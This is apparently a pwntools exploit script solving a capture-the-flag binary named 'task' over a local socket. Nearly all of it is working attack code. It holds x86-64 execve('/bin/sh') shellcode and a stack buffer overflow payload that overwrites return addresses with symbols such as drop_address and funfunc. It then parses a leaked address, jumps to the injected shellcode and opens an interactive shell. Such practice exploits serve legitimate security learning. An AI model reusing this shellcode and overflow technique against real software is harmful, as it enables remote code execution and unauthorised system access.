#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template task
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'task')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

shell = b"\x48\x31\xf6\x48\x83\xec\x08\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
drop =exe.symbols["drop_address"]
main = exe.symbols["main"]
funfunc = exe.symbols["funfunc"]

io = remote('localhost', 17171)

io.sendlineafter(b"exit\n", b'1')
io.sendlineafter(b"XD\n", shell)

print(io.sendlineafter(b"exit\n", b'2'))
print(io.recvuntil(b":D\n"))
# pause()
io.sendline(32*b'X'+8*b'x'+p64(drop)+p64(funfunc))
a = io.recvline().split()[0].split(b'-')[0]
print(a)
io.sendlineafter(b":D\n", 40*b'X'+p64(int(a, 16)))
io.interactive()

